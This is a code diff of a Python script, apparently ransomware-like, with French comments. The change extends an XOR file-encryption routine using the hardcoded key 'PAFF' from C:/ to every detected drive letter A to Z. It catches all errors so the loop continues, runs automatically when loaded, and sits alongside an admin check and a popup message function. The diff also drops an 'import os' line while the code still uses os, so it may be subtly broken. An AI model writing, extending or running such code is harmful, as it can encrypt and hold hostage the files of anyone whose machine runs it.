@@ -28,7 +28,8 @@ def is_admin():
         return False
 
 
-import os
+
+import string
 
 def xor_encrypt_file(src, dst, key):
     with open(src, "rb") as f:
@@ -38,7 +39,14 @@ def xor_encrypt_file(src, dst, key):
     with open(dst, "wb") as f:
         f.write(encrypted)
 
-def encrypt_demo_folder(key_str="PAFF", root="C:/"):
+def encrypt_all_drives(key_str="PAFF"):
+    # Liste toutes les lettres de disque possibles (A: à Z:)
+    for drive_letter in string.ascii_uppercase:
+        drive_path = f"{drive_letter}:/"
+        if os.path.exists(drive_path):
+            encrypt_demo_folder(key_str, drive_path)
+
+def encrypt_demo_folder(key_str, root):
     enc_dir = os.path.join(root, "encrypted")
     os.makedirs(enc_dir, exist_ok=True)
     
@@ -53,8 +61,11 @@ def encrypt_demo_folder(key_str="PAFF", root="C:/"):
                 xor_encrypt_file(src, dst, key_str)
             except PermissionError:
                 print(f"[ERREUR] Pas d'accès à {src}")
+            except Exception as e:
+                print(f"[ERREUR] {src} -> {e}")
 
-encrypt_demo_folder(key_str="PAFF", root="C:/")
+# Lancer sur tous les disques détectés
+encrypt_all_drives("PAFF")
 
 def show_message(title, message, borderless=False):
     root = tk.Tk()
